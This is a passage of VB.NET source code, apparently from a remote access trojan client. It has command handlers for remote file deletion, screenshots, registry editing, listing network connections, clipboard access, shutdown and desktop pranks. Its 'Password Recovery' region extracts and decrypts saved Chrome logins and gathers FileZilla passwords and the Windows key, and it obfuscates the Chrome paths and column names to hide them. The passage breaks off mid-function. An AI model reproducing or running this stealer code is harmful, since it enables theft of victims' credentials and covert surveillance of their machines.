        Win32.ActiveWindows.Add(Hwnd)
        Return True
    End Function
    Public Function GetWindowState(hwnd As IntPtr) As String
        If Win32.IsZoomed(hwnd) = New IntPtr(1) Then
            Return "Maximized"
        ElseIf Win32.IsIconic(hwnd) = New IntPtr(1) Then
            Return "Minimized"
        End If
        Return "Normal"
    End Function
    Public Function RestoreWindow(ByVal handle As IntPtr) As Boolean
        Try
            Return CBool(Win32.ShowWindow(handle, CType(9, IntPtr)))
        Catch
            Return False
        End Try
    End Function
    Public Function MinimizeWindow(ByVal handle As IntPtr) As Boolean
        Try
            Return CBool(Win32.ShowWindow(handle, CType(6, IntPtr)))
        Catch
            Return False
        End Try
    End Function
    Public Function MaximizeWindow(ByVal handle As IntPtr) As Boolean
        Try
            Return CBool(Win32.ShowWindow(handle, CType(3, IntPtr)))
        Catch
            Return False
        End Try
    End Function
    Public Function CloseWindow(ByVal handle As IntPtr) As Boolean
        Try
            Win32.SendMessageA(handle, &H10, 0, 0)
            Return Nothing
        Catch
            Return False
        End Try
    End Function
    Public Function FreezeWindow(ByVal handle As IntPtr) As Boolean
        Try
            Return CBool(Win32.EnableWindow(CInt(handle), 0))
        Catch
            Return False
        End Try
    End Function
    Public Function UnfreezeWindow(ByVal handle As IntPtr) As Boolean
        Try
            Return CBool(Win32.EnableWindow(CInt(handle), 1))
        Catch
            Return False
        End Try
    End Function
    Public Function SetText(ByVal handle As IntPtr, ByVal text As String) As Boolean
        Try
            Return Win32.SetWindowText(handle, text)
        Catch
            Return False
        End Try
    End Function
#End Region

#Region "Command - Filemanager"

    Private Function GetFileType(ByVal FileName As String) As String
        Try
            GetFileType = ""
            Dim extensionName As String = CStr(My.Computer.Registry.GetValue("HKEY_CLASSES_ROOT\" & FileName.Substring(FileName.LastIndexOf(".")), "", FileName.Substring(FileName.LastIndexOf("."))))
            GetFileType = CStr(My.Computer.Registry.GetValue("HKEY_CLASSES_ROOT\" & extensionName, "", FileName.Substring(FileName.LastIndexOf("."))))
        Catch
            GetFileType = "File"
        End Try
        Return GetFileType
    End Function

    Private Function GetFileInfo(ByVal Filepath As String) As String
        Dim InfoString As String = Nothing
        Dim filex As New FileInfo(Filepath)
        Dim sizeInBytes As Long = filex.Length
        Dim Filename As String = Nothing
        Dim FileDescription As String = Nothing
        Dim FileLocation As String = Nothing
        Dim FileSize As String = Nothing
        Dim FileType As String = Nothing
        Dim FileCreationDate As String = Nothing
        Dim AtrribHidden As String = Nothing
        Dim AttribSystem As String = Nothing
        Dim AttribReadonly As String = Nothing
        Dim AttribTemp As String = Nothing
        Dim IconBytes As String = Nothing
        Dim attributes As FileAttributes = System.IO.File.GetAttributes(Filepath)
        Try
            Filename = Path.GetFileName(Filepath)
        Catch
            Filename = "Unknown"
        End Try
        Try
            FileDescription = FileVersionInfo.GetVersionInfo(Filepath).FileDescription.ToString
        Catch
            FileDescription = "Unknown"
        End Try
        Try
            FileLocation = Path.GetFullPath(Filepath)
        Catch
            FileLocation = "Unknown"
        End Try
        Try
            FileSize = roundObjectSize(CStr(sizeInBytes))
        Catch
            FileSize = "Unknown"
        End Try
        Try
            FileType = Path.GetFileName(GetFileType(Filepath))
        Catch
            FileType = "Unknown"
        End Try
        Try
            FileCreationDate = filex.CreationTime.Date.ToString
        Catch
            FileCreationDate = "Unknown"
        End Try
        If (attributes And FileAttributes.Hidden) = FileAttributes.Hidden Then
            AtrribHidden = "1"
        Else
            AtrribHidden = "0"
        End If
        If (attributes And FileAttributes.System) = FileAttributes.System Then
            AttribSystem = "1"
        Else
            AttribSystem = "0"
        End If
        If (attributes And FileAttributes.ReadOnly) = FileAttributes.ReadOnly Then
            AttribReadonly = "1"
        Else
            AttribReadonly = "0"
        End If
        If (attributes And FileAttributes.Temporary) = FileAttributes.Temporary Then
            AttribTemp = "1"
        Else
            AttribTemp = "0"
        End If
        Try
            IconBytes = ImageToHex(System.Drawing.Icon.ExtractAssociatedIcon(Filepath).ToBitmap)
        Catch
            IconBytes = String.Empty
        End Try
        InfoString = IconBytes & "|||" & Filename & "|||" & FileDescription & "|||" & FileType & "|||" & FileLocation & "|||" & FileCreationDate & "|||" & FileSize & "|||" & AtrribHidden & "|||" & AttribSystem & "|||" & AttribReadonly & "|||" & AttribTemp
        Return InfoString
    End Function

    Private Function CreateDirectory(ByVal Directorypath As String) As Integer
        Try
            IO.Directory.CreateDirectory(Directorypath)
            Return 1
        Catch ex As UnauthorizedAccessException
            Return 2
        Catch
            Return 3
        End Try
        Return 3
    End Function

    Private Function DeleteDirectory(path As String) As Integer
        Try
            If Directory.Exists(path) Then
                'Delete all files from the Directory
                For Each filepath As String In Directory.GetFiles(path)
                    File.Delete(filepath)
                Next
                'Delete all child Directories
                For Each dir As String In Directory.GetDirectories(path)
                    DeleteDirectory(dir)
                Next
                'Delete a Directory
                Directory.Delete(path)
            End If
            Return 1
        Catch ex As UnauthorizedAccessException
            Return 2
        Catch ex2 As Exception
            Return 3
        End Try
    End Function


    Private Function ListDrives() As String
        Dim Drives As String = Nothing
        For Each Drive In DriveInfo.GetDrives
            Drives &= Drive.ToString & " - " & Drive.DriveType.ToString & "|||"
        Next
        Drives = Drives.Substring(0, Drives.Length - 3)
        Return Drives
    End Function

    Private Function checkIfValueIsDecimal(ByVal value As String) As String
        Dim result As String
        If value.Contains(",") Then : result = CDbl(value).ToString("###.##")
        Else : result = CDbl(value).ToString("###.00") : End If
        Return result
    End Function

    Private Function roundObjectSize(ByVal ObjectSize As String) As String
        Dim oneByte As Integer = 1
        Dim kiloByte As Integer = 1024
        Dim megaByte As Integer = 1048576
        Dim gigaByte As Integer = 1073741824
        Dim terraByte As Long = 1099511627776
        Dim pettaByte As Long = 1125899906842624

        Select Case CLng(ObjectSize)
            Case 0 To kiloByte - 1
                If (CDbl(checkIfValueIsDecimal(CStr(CDec(ObjectSize) / oneByte))) >= 1000) = False Then
                    ObjectSize = CStr(CInt(ObjectSize) / 1) + " Bytes"
                Else : ObjectSize = "1,00 KB" : End If

            Case kiloByte To megaByte - 1
                If (CDbl(checkIfValueIsDecimal(CStr(CDec(ObjectSize) / kiloByte))) >= 1000) = False Then
                    ObjectSize = checkIfValueIsDecimal(CStr(CDec(ObjectSize) / kiloByte)) + " KB"
                Else : ObjectSize = "1,00 MB" : End If

            Case megaByte To gigaByte - 1
                If (CDbl(checkIfValueIsDecimal(CStr(CDec(ObjectSize) / megaByte))) >= 1000) = False Then
                    ObjectSize = checkIfValueIsDecimal(CStr(CDec(ObjectSize) / megaByte)) + " MB"
                Else : ObjectSize = "1,00 GB" : End If

            Case gigaByte To terraByte - 1
                If (CDbl(checkIfValueIsDecimal(CStr(CDec(ObjectSize) / gigaByte))) >= 1000) = False Then
                    ObjectSize = checkIfValueIsDecimal(CStr(CDec(ObjectSize) / gigaByte)) + " GB"
                Else : ObjectSize = "1,00 TB" : End If

            Case terraByte To pettaByte - 1
                If (CDbl(checkIfValueIsDecimal(CStr(CDec(ObjectSize) / terraByte))) >= 1000) = False Then
                    ObjectSize = checkIfValueIsDecimal(CStr(CDec(ObjectSize) / terraByte)) + " TB"
                Else : ObjectSize = "1,00 PB" : End If
        End Select
        Return ObjectSize
    End Function


    Private Function FormatFileData(ByVal Path As String) As String
        Dim drvInfo As System.IO.DirectoryInfo = New System.IO.DirectoryInfo(Path)
        Dim sourceFolderSize() As System.IO.FileSystemInfo
        Dim fileSize As Long = 0
        Dim myList As String = Nothing
        Dim filesInfo() As System.IO.FileInfo = drvInfo.GetFiles("*.*", System.IO.SearchOption.TopDirectoryOnly)
        sourceFolderSize = drvInfo.GetFileSystemInfos()
        Try
            For Each fileName As System.IO.FileInfo In filesInfo
                fileSize = fileName.Length
                myList = myList & fileName.Name.ToString & "|||" & roundObjectSize(fileSize.ToString) & "|||" & fileName.LastAccessTime.Day.ToString & "/" & fileName.LastAccessTime.Month.ToString & "/" & fileName.LastAccessTime.Year.ToString & "||||"
            Next
        Catch
        End Try
        Return myList
    End Function

    Private Function FormatDirectoryData(ByVal Path As String) As String
        Dim drvInfo As System.IO.DirectoryInfo = New System.IO.DirectoryInfo(Path)
        Dim sourceFolderSize() As System.IO.FileSystemInfo
        Dim myList As String = Nothing
        Dim DirectoryInfo() As System.IO.DirectoryInfo = drvInfo.GetDirectories
        sourceFolderSize = drvInfo.GetFileSystemInfos()
        Try
            For Each DirName As System.IO.DirectoryInfo In DirectoryInfo
                myList = myList & DirName.Name.ToString & "|||" & DirName.LastAccessTime.Day.ToString & "/" & DirName.LastAccessTime.Month.ToString & "/" & DirName.LastAccessTime.Year.ToString & "||||"
            Next
        Catch
        End Try
        Return myList
    End Function

    Private Function DeleteFolder(ByVal Path As String) As Integer
        Try
            Directory.Delete(Path, True)
            Return 1
        Catch uex As UnauthorizedAccessException
            DebugToConsole("Exception: " & uex.Message, DebugStatus.Failed)
            Return 2
        Catch ex As Exception
            DebugToConsole("Exception: " & ex.Message, DebugStatus.Failed)
            Return 3
        End Try
        Return CInt(False)
    End Function

#End Region

#Region "Command - Screenviewer"

    Private Function ScreenshotStamp(ByVal Quality As Integer, Optional ByVal StampString As String = Nothing) As Image
        Dim Rect As Rectangle = Screen.PrimaryScreen.Bounds
        Dim ImageCodec() As System.Drawing.Imaging.ImageCodecInfo = System.Drawing.Imaging.ImageCodecInfo.GetImageEncoders()
        Dim EncodeParameters As New System.Drawing.Imaging.EncoderParameters(1)
        EncodeParameters.Param(0) = New System.Drawing.Imaging.EncoderParameter(System.Drawing.Imaging.Encoder.Quality, Quality)
        Dim MySnapshot As Bitmap = New Bitmap(Rect.Width, Rect.Height), Graphics As Graphics = Graphics.FromImage(MySnapshot)
        Graphics.CopyFromScreen(0, 0, 0, 0, MySnapshot.Size)
        Dim Stamp As New Font(System.Drawing.FontFamily.GenericSansSerif, 14, FontStyle.Bold, GraphicsUnit.Point)
        Graphics.DrawString(StampString, Stamp, Brushes.Red, 6, 6)
        Dim Ms As New IO.MemoryStream
        MySnapshot.Save(Ms, ImageCodec(1), EncodeParameters)
        Return Image.FromStream(Ms)
    End Function

    Private Function Screenshot(ByVal Quality As Integer) As Image
        Dim Rect As Rectangle = Screen.PrimaryScreen.Bounds
        Dim ImageCodec() As System.Drawing.Imaging.ImageCodecInfo = System.Drawing.Imaging.ImageCodecInfo.GetImageEncoders()
        Dim EncodeParameters As New System.Drawing.Imaging.EncoderParameters(1)
        EncodeParameters.Param(0) = New System.Drawing.Imaging.EncoderParameter(System.Drawing.Imaging.Encoder.Quality, Quality)
        Dim MySnapshot As Bitmap = New Bitmap(Rect.Width, Rect.Height), Graphics As Graphics = Graphics.FromImage(MySnapshot)
        Graphics.CopyFromScreen(0, 0, 0, 0, MySnapshot.Size)
        Dim Ms As New IO.MemoryStream
        MySnapshot.Save(Ms, ImageCodec(1), EncodeParameters)
        Return Image.FromStream(Ms)
    End Function

#End Region

#Region "Command - Registrymanager"

    Private Function DoesKeyExist(ByVal registrykey As String) As Boolean
        Dim regVersion As Microsoft.Win32.RegistryKey
        regVersion = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(registrykey, True)
        If regVersion Is Nothing Then
            Return False
        Else
            Return True
        End If
    End Function

    Private Function byteArrayToHex(ByVal bytes_Input As Byte()) As String
        Dim strTemp As New StringBuilder(bytes_Input.Length * 2)
        For Each b As Byte In bytes_Input
            strTemp.Append(b.ToString("X02"))
        Next
        Return strTemp.ToString()
    End Function

    Private Function ListRegistryKeys(ByVal RegistryHive As String, ByVal RegistryPath As String) As String
        Dim RegistryKeyList As New StringBuilder
        Dim key As Microsoft.Win32.RegistryKey
        Select Case RegistryHive
            Case "HKEY_LOCAL_MACHINE" : key = My.Computer.Registry.LocalMachine.OpenSubKey(RegistryPath)
            Case "HKEY_CURRENT_USER" : key = My.Computer.Registry.CurrentUser.OpenSubKey(RegistryPath)
            Case "HKEY_CLASSES_ROOT" : key = My.Computer.Registry.ClassesRoot.OpenSubKey(RegistryPath)
            Case "HKEY_CURRENT_CONFIG" : key = My.Computer.Registry.CurrentConfig.OpenSubKey(RegistryPath)
            Case "HKEY_USERS" : key = My.Computer.Registry.Users.OpenSubKey(RegistryPath)
            Case Else
                Throw New Exception("Unknow Registry Hive.")
        End Select
        For Each subkey In key.GetSubKeyNames
            RegistryKeyList.Append(subkey.ToString & "|||")
        Next
        Return RegistryKeyList.ToString()
    End Function

    Private Function ListRegistryValues(ByVal RegistryHive As String, ByVal RegistryPath As String) As String
        Dim key As Microsoft.Win32.RegistryKey
        Select Case RegistryHive
            Case "HKEY_LOCAL_MACHINE" : key = My.Computer.Registry.LocalMachine.OpenSubKey(RegistryPath)
            Case "HKEY_CURRENT_USER" : key = My.Computer.Registry.CurrentUser.OpenSubKey(RegistryPath)
            Case "HKEY_CLASSES_ROOT" : key = My.Computer.Registry.ClassesRoot.OpenSubKey(RegistryPath)
            Case "HKEY_CURRENT_CONFIG" : key = My.Computer.Registry.CurrentConfig.OpenSubKey(RegistryPath)
            Case "HKEY_USERS" : key = My.Computer.Registry.Users.OpenSubKey(RegistryPath)
            Case Else
                Throw New Exception("Unknow Registry Hive.")
        End Select
        Dim keystr As String = Nothing
        If DoesKeyExist(RegistryPath) = True Then
            For Each v In key.GetValueNames()
                keystr &= v & "~~~~"
                keystr &= key.GetValueKind(v).ToString() & "~~~~"
                If TypeOf key.GetValue(v) Is Byte() Then
                    keystr &= byteArrayToHex(CType(key.GetValue(v), Byte())) & "|||"
                ElseIf TypeOf key.GetValue(v) Is String Then
                    keystr &= key.GetValue(v).ToString & "|||"
                Else
                    keystr &= key.GetValue(v).ToString & "|||"
                End If
            Next
        End If
        Return keystr
    End Function

    Public Function RegSetCreateValue(ByVal RegistryPath As String, ByVal RegistryValue As String, ByVal NewData As String) As Boolean
        Try
            My.Computer.Registry.SetValue(RegistryPath, RegistryValue, NewData)
            Return True
        Catch ex As UnauthorizedAccessException
            Return False
        Catch
            Return False
        End Try
    End Function

    Public Function DeleteReyKeyValue(ByVal Key As String, ByVal valueName As String) As Long
        Dim Handle As IntPtr
        Dim Hive As String = Split(Key, "\")(0)
        Select Case Hive
            Case "HKEY_CLASSES_ROOT"
                Handle = CType(&H80000000, IntPtr)
            Case "HKEY_CURRENT_USER"
                Handle = CType(&H80000001, IntPtr)
            Case "HKEY_LOCAL_MACHINE"
                Handle = CType(&H80000002, IntPtr)
            Case "HKEY_USERS"
                Handle = CType(&H80000003, IntPtr)
            Case "HKEY_CURRENT_CONFIG"
                Handle = CType(&H80000005, IntPtr)
        End Select
        Key = Key.Replace(Hive + "\", String.Empty)
        Return Win32.RegDeleteKeyValue(Handle, Key, valueName)
    End Function

    Public Function SetReyKeyValue(ByVal Key As String, ByVal valueName As String, ByVal Value As String) As Boolean
        Try
            Registry.SetValue(Key, valueName, Value)
            Return True
        Catch ex As UnauthorizedAccessException
            Return False
        Catch
            Return False
        End Try
    End Function

#End Region

#Region "Command - Networkviewer"

    Public Enum STATE_CONNECTION As UInteger
        CLOSED = 1
        LISTENING = 2
        SYN_SENT = 3
        SYN_RCVD = 4
        ESTABLISHED = 5
        FIN_WAIT1 = 6
        FIN_WAIT2 = 7
        CLOSE_WAIT = 8
        CLOSING = 9
        LAST_ACK = 10
        TIME_WAIT = 11
        DELETE_TCB = 12
    End Enum

    <StructLayout(LayoutKind.Sequential)> _
    Public Structure MIB_TCPROW_OWNER_PID
        Public state As STATE_CONNECTION
        Public localAddr As UInteger
        Public localport As UInteger
        Public remoteAddr As UInteger
        Public remoteport As UInteger
        Public Pid As UInteger
    End Structure

    <StructLayout(LayoutKind.Sequential)> _
    Public Structure MIB_UDPROW_OWNER_PID
        Public localAddr As UInteger
        Public localport As UInteger
        Public Pid As UInteger
    End Structure

    <StructLayout(LayoutKind.Sequential)> _
    Private Structure MIB_TCPTABLE_OWNER_PID
        Public dwNumEntries As UInteger
        Private table As MIB_TCPROW_OWNER_PID
    End Structure

    <StructLayout(LayoutKind.Sequential)> _
    Public Structure MIB_UDPTABLE_OWNER_PID
        Public dwNumEntries As UInteger
        Private table As MIB_UDPROW_OWNER_PID
    End Structure

    Public Function ReturnAllConnections() As String
        Dim AllConnections As String = Nothing
        For Each connection In GetAllTcpConnections()
            AllConnections &= connection.Protocol.ToString & "|||" & connection.LocalEndPoint.ToString & "|||" & connection.RemoteEndPoint.ToString & "|||" & connection.State & "|||" & connection.PID & "||||"
        Next
        AllConnections &= "~~~"
        For Each connection In GetAllUdpConnections()
            AllConnections &= connection.Protocol.ToString & "|||" & connection.LocalEndPoint.ToString & "|||" & connection.RemoteEndPoint.ToString & "|||" & connection.State & "|||" & connection.PID & "||||"
        Next
        Return AllConnections
    End Function

    Public Function GetAllTcpConnections() As List(Of Connection)
        Dim buffSize As Integer = 0
        Dim Connections As New List(Of Connection)
        Dim AF_INET As Integer = 2
        Dim ret As UInteger = Win32.GetExtendedTcpTable(IntPtr.Zero, buffSize, True, AF_INET, Win32.TCP_TABLE_CLASS.TCP_TABLE_OWNER_PID_ALL, 0)
        Dim buffTable As IntPtr = Marshal.AllocHGlobal(buffSize)

        Try
            ret = Win32.GetExtendedTcpTable(buffTable, buffSize, True, AF_INET, Win32.TCP_TABLE_CLASS.TCP_TABLE_OWNER_PID_ALL, 0)
            If ret <> 0 Then
                Return Connections
            End If
            Dim tab As MIB_TCPTABLE_OWNER_PID = CType(Marshal.PtrToStructure(buffTable, GetType(MIB_TCPTABLE_OWNER_PID)), MIB_TCPTABLE_OWNER_PID)
            Dim rowPtr As IntPtr = CType(CLng(buffTable) + Marshal.SizeOf(tab.dwNumEntries), IntPtr)
            For i As Integer = 0 To CInt(tab.dwNumEntries - 1)
                Dim tcpRow As MIB_TCPROW_OWNER_PID = CType(Marshal.PtrToStructure(rowPtr, GetType(MIB_TCPROW_OWNER_PID)), MIB_TCPROW_OWNER_PID)
                Connections.Add(New Connection(tcpRow))
                rowPtr = CType(CLng(rowPtr) + Marshal.SizeOf(tcpRow), IntPtr)
            Next
        Finally
            Marshal.FreeHGlobal(buffTable)
        End Try
        Return Connections
    End Function

    Public Function GetAllUdpConnections() As List(Of Connection)
        Dim buffSize As Integer = 0
        Dim Connections As New List(Of Connection)
        Dim AF_INET As Integer = 2
        Dim ret As UInteger = Win32.GetExtendedUdpTable(IntPtr.Zero, buffSize, True, AF_INET, Win32.UDP_TABLE_CLASS.UDP_TABLE_OWNER_PID, 0)
        Dim buffTable As IntPtr = Marshal.AllocHGlobal(buffSize)
        Try
            ret = Win32.GetExtendedUdpTable(buffTable, buffSize, True, AF_INET, Win32.UDP_TABLE_CLASS.UDP_TABLE_OWNER_PID, 0)
            If ret <> 0 Then
                Return Connections
            End If
            Dim tab As MIB_UDPTABLE_OWNER_PID = CType(Marshal.PtrToStructure(buffTable, GetType(MIB_UDPTABLE_OWNER_PID)), MIB_UDPTABLE_OWNER_PID)
            Dim rowPtr As IntPtr = CType(CLng(buffTable) + Marshal.SizeOf(tab.dwNumEntries), IntPtr)
            For i As Integer = 0 To CInt(tab.dwNumEntries - 1)
                Dim udpRow As MIB_UDPROW_OWNER_PID = CType(Marshal.PtrToStructure(rowPtr, GetType(MIB_UDPROW_OWNER_PID)), MIB_UDPROW_OWNER_PID)
                Connections.Add(New Connection(udpRow))
                rowPtr = CType(CLng(rowPtr) + Marshal.SizeOf(udpRow), IntPtr)
            Next
        Finally
            Marshal.FreeHGlobal(buffTable)
        End Try
        Return Connections
    End Function

    Public Class Connection

        Private pProtocol As String
        Private pLocalEndPoint As IPEndPoint
        Private pRemoteEndPoint As IPEndPoint
        Private pState As STATE_CONNECTION
        Private pPid As UInteger

        Public Sub New(ByVal tcpRow As MIB_TCPROW_OWNER_PID)
            pProtocol = "TCP"
            pLocalEndPoint = New IPEndPoint(tcpRow.localAddr, ConvertPort(tcpRow.localport))
            pRemoteEndPoint = New IPEndPoint(tcpRow.remoteAddr, ConvertPort(tcpRow.remoteport))
            pState = tcpRow.state
            pPid = tcpRow.Pid
        End Sub

        Public Sub New(ByVal udpRow As MIB_UDPROW_OWNER_PID)
            pProtocol = "UDP"
            pLocalEndPoint = New IPEndPoint(udpRow.localAddr, ConvertPort(udpRow.localport))
            pRemoteEndPoint = New IPEndPoint(0, 0)
            pState = STATE_CONNECTION.LISTENING
            pPid = udpRow.Pid
        End Sub

        Public ReadOnly Property Protocol() As String
            Get
                Return pProtocol
            End Get
        End Property

        Public ReadOnly Property LocalEndPoint() As IPEndPoint
            Get
                Return pLocalEndPoint
            End Get
        End Property

        Public ReadOnly Property RemoteEndPoint() As IPEndPoint
            Get
                Return pRemoteEndPoint
            End Get
        End Property

        Public ReadOnly Property State() As String
            Get
                Return pState.ToString()
            End Get
        End Property

        Public ReadOnly Property PID() As UInteger
            Get
                Return pPid
            End Get
        End Property

        Private Function ConvertPort(ByVal port As UInteger) As Integer
            Return CInt((port / 256) + ((port Mod 256) * 256))
        End Function
    End Class

#End Region

#Region "Command - Misc Functions"

#Region "Fun Options"
    Private Sub HideTaskbar()
        Win32.ShowWindow(CType(Win32.FindWindow("Shell_TrayWnd", ""), IntPtr), CType(Win32.SW_HIDE, IntPtr))
    End Sub

    Private Sub ShowTaskbar()
        Win32.ShowWindow(CType(Win32.FindWindow("Shell_TrayWnd", ""), IntPtr), CType(Win32.SW_SHOW, IntPtr))
    End Sub

    Private Sub ShowClock()
        Dim shelltraywnd As Integer = Win32.FindWindow("Shell_TrayWnd", "")
        Dim traynotifywnd As Integer = CInt(Win32.FindWindowEx(CType(shelltraywnd, IntPtr), CType(0&, IntPtr), "traynotifywnd", vbNullString))
        Dim trayclockwclass As Integer = CInt(Win32.FindWindowEx(CType(traynotifywnd, IntPtr), CType(0&, IntPtr), "trayclockwclass", vbNullString))
        Win32.ShowWindow(CType(trayclockwclass, IntPtr), CType(1, IntPtr))
    End Sub

    Private Sub HideClock()
        Dim shelltraywnd As Integer = Win32.FindWindow("Shell_TrayWnd", "")
        Dim traynotifywnd As Integer = CInt(Win32.FindWindowEx(CType(shelltraywnd, IntPtr), CType(0&, IntPtr), "traynotifywnd", vbNullString))
        Dim trayclockwclass As Integer = CInt(Win32.FindWindowEx(CType(traynotifywnd, IntPtr), CType(0&, IntPtr), "trayclockwclass", vbNullString))
        Win32.ShowWindow(CType(trayclockwclass, IntPtr), CType(0, IntPtr))
    End Sub

    Private Sub LocktaskBar()
        Win32.EnableWindow(CInt(Win32.FindWindow("Shell_traywnd", vbNullString)), 0)
    End Sub

    Private Sub UnlocktaskBar()
        Win32.EnableWindow(CInt(Win32.FindWindow("Shell_traywnd", vbNullString)), 1)
    End Sub

    Private Sub OpenCDTray()
        Win32.mciSendStringA("set CDAudio door open", "", 127, 0)
    End Sub

    Private Sub CloseCDTray()
        Win32.mciSendStringA("set CDAudio door closed", "", 127, 0)
    End Sub

    Sub HideDesktopIcons()
        Dim hWnd As IntPtr = CType(Win32.FindWindow("ProgMan", Nothing), IntPtr)
        hWnd = Win32.GetWindow(hWnd, CType(5, Win32.GetWindow_Cmd))
        Win32.ShowWindow(hWnd, CType(0, IntPtr))
    End Sub
    Sub ShowDesktopIcons()
        Dim hWnd As IntPtr = CType(Win32.FindWindow("ProgMan", Nothing), IntPtr)
        hWnd = Win32.GetWindow(hWnd, CType(5, Win32.GetWindow_Cmd))
        Win32.ShowWindow(hWnd, CType(4, IntPtr))
    End Sub

#End Region

#Region "Power Options"
    Private Sub PowerOptions(ByVal PowerFlag As Integer)
        Dim ok As Boolean
        Dim tp As Win32.TokPriv1Luid
        Dim hproc As IntPtr = Win32.GetCurrentProcess()
        Dim htok As IntPtr = IntPtr.Zero
        ok = Win32.OpenProcessToken(hproc, Win32.TOKEN_ADJUST_PRIVILEGES Or Win32.TOKEN_QUERY, htok)
        tp.Count = 1
        tp.Luid = 0
        tp.Attr = Win32.SE_PRIVILEGE_ENABLED
        ok = Win32.LookupPrivilegeValue(Nothing, Win32.SE_SHUTDOWN_NAME, tp.Luid)
        ok = Win32.AdjustTokenPrivileges(htok, False, tp, 0, IntPtr.Zero, IntPtr.Zero)
        ok = Win32.ExitWindowsEx(PowerFlag, 0)
    End Sub

    Private Sub StartScreenSaver()
        Dim hWnd As Integer
        hWnd = Win32.GetDesktopWindow()
        Win32.SendMessage(CType(hWnd, IntPtr), Win32.WM_SYSCOMMAND, CType(Win32.SC_SCREENSAVE, IntPtr), CType(0, IntPtr))
    End Sub

#End Region


#End Region

#Region "Command - MessageBox Manager"

    Private Function ChooseIcon(ByVal Index As String) As MessageBoxIcon
        Select Case Index
            Case "0"
                Return MessageBoxIcon.None
            Case "1"
                Return MessageBoxIcon.Information
            Case "2"
                Return MessageBoxIcon.Question
            Case "3"
                Return MessageBoxIcon.Exclamation
            Case "4"
                Return MessageBoxIcon.Error
            Case Else
                Return MessageBoxIcon.None
        End Select
    End Function

    Private Function ChooseButtons(ByVal Index As String) As MessageBoxButtons
        Select Case Index
            Case "0"
                Return MessageBoxButtons.OK
            Case "1"
                Return MessageBoxButtons.OKCancel
            Case "2"
                Return MessageBoxButtons.AbortRetryIgnore
            Case "3"
                Return MessageBoxButtons.YesNo
            Case "4"
                Return MessageBoxButtons.YesNoCancel
            Case Else
                Return MessageBoxButtons.OK
        End Select
    End Function

    Private Sub ShowMessageBox(ByVal Message As String, ByVal Title As String, ByVal Icon As MessageBoxIcon, ByVal Buttons As MessageBoxButtons)
        Win32.MessageBox(IntPtr.Zero, Message, Title, CType(Buttons Or &H10000 Or Icon, MessageBoxOptions))
    End Sub

#End Region

#Region "Command - Clipboard"

    Private Sub ClipboardSetText(ByVal Text As String)
        If String.IsNullOrEmpty(Text) Then
            My.Computer.Clipboard.SetText(" ")
        Else
            My.Computer.Clipboard.SetText(Text)
        End If
    End Sub

    Private Function ClipboardGetText() As String
        Return My.Computer.Clipboard.GetText.ToString
    End Function

#End Region

#Region "Command - Softwaremanager"

    Const RegistryKey32 As String = "SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"
    Const RegistryKey64 As String = "SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall"


    Private Function GetSoftwareList() As String
        Dim SoftwareString As String = Nothing
        For Each Program In GetInstalledPrograms()
            SoftwareString &= Program & ";;;"
        Next
        Return SoftwareString
    End Function

    Public Function GetInstalledPrograms() As List(Of String)
        Dim result = New List(Of String)()
        result.AddRange(GetInstalledProgramsFromRegistry())
        Return result
    End Function

    Private Function GetInstalledProgramsFromRegistry() As IEnumerable(Of String)
        Dim ProgramList = New List(Of String)()
        Using key As RegistryKey = Registry.LocalMachine.OpenSubKey(RegistryKey32)
            For Each subkey_name As String In key.GetSubKeyNames()
                Using subkey As RegistryKey = key.OpenSubKey(subkey_name)
                    If IsProgramVisible(subkey) Then
                        Dim Publisher As String = DirectCast(subkey.GetValue("Publisher"), String)
                        Dim UninstallString As String = DirectCast(subkey.GetValue("UninstallString"), String)
                        If String.IsNullOrEmpty(Publisher) Then
                            Publisher = "Unknown"
                        End If
                        If String.IsNullOrEmpty(UninstallString) Then
                            UninstallString = "Unknown"
                        End If
                        ProgramList.Add(DirectCast(subkey.GetValue("DisplayName"), String) & "|||" & Publisher & "|||" & UninstallString & "||||")
                    End If
                End Using
            Next
        End Using
        Try
            Using key As RegistryKey = Registry.LocalMachine.OpenSubKey(RegistryKey64)
                For Each subkey_name As String In key.GetSubKeyNames()
                    Using subkey As RegistryKey = key.OpenSubKey(subkey_name)
                        If IsProgramVisible(subkey) Then
                            Dim Publisher As String = DirectCast(subkey.GetValue("Publisher"), String)
                            Dim UninstallString As String = DirectCast(subkey.GetValue("UninstallString"), String)
                            If String.IsNullOrEmpty(Publisher) Then
                                Publisher = "Unknown"
                            End If
                            If String.IsNullOrEmpty(UninstallString) Then
                                UninstallString = "Unknown"
                            End If
                            ProgramList.Add(DirectCast(subkey.GetValue("DisplayName"), String) & "|||" & Publisher & "|||" & UninstallString & "||||")
                        End If
                    End Using
                Next
            End Using
        Catch
        End Try
        Return ProgramList
    End Function

    Private Function IsProgramVisible(subkey As RegistryKey) As Boolean
        Dim name = DirectCast(subkey.GetValue("DisplayName"), String)
        Dim releaseType = DirectCast(subkey.GetValue("ReleaseType"), String)
        Dim systemComponent = subkey.GetValue("SystemComponent")
        Dim parentName = DirectCast(subkey.GetValue("ParentDisplayName"), String)
        Return Not String.IsNullOrEmpty(name) AndAlso String.IsNullOrEmpty(releaseType) AndAlso String.IsNullOrEmpty(parentName) AndAlso (systemComponent Is Nothing)
    End Function

#End Region

#Region "Command - Password Recovery"

    Private Function GetAllPasswords() As String
        Dim Passwords As String = String.Concat(WinKey() & Passwords_Chrome() & Passwords_FileZilla())
        Return Passwords
    End Function

#Region "Chrome Passwords"

    Public Function Passwords_Chrome() As String
        Dim Buffer As String = Nothing
        Dim datapath As String = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + RotateRight("WBjjbg`W>cmjh`WPn`m?\o\W?`a\pgoWGjbdi?\o\")
        Try
            Dim SQLDatabase = New ChromeHandler(datapath)
            SQLDatabase.ReadTable("logins")
            If IO.File.Exists(datapath) Then
                Dim site As String
                Dim user As String
                Dim pass As String
                For i As Int32 = 0 To SQLDatabase.GetRowCount() - 1 Step 1
                    site = SQLDatabase.GetValue(i, RotateRight("jmdbdiZpmg"))
                    user = SQLDatabase.GetValue(i, RotateRight("pn`mi\h`Zq\gp`"))
                    pass = Decrypt(System.Text.Encoding.Default.GetBytes(SQLDatabase.GetValue(i, RotateRight("k\nnrjm_Zq\gp`"))))

                    If (user <> "") And (pass <> "") Then
                        Buffer += ("Chrome|||" & user & "|||" & pass & "|||" & site & "||||")
                    End If
                Next
            End If
        Catch
        End Try
        Return Buffer
    End Function

    Function Decrypt(ByVal Datas() As Byte) As String
